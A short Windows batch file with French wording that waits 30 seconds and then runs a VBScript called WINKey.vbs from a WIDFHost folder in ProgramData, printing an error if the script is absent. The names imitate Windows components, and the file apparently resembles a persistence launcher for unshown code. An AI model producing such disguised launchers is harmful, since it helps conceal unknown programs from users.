@echo off
set chemin_executable=%ProgramData%\WIDFHost\WINKey.vbs

timeout /t 30

if exist "%chemin_executable%" (
    cscript "%chemin_executable%"
) else (
    echo Le script WINKey.vbs est introuvable dans le dossier WIDFHost de ProgramData.
)
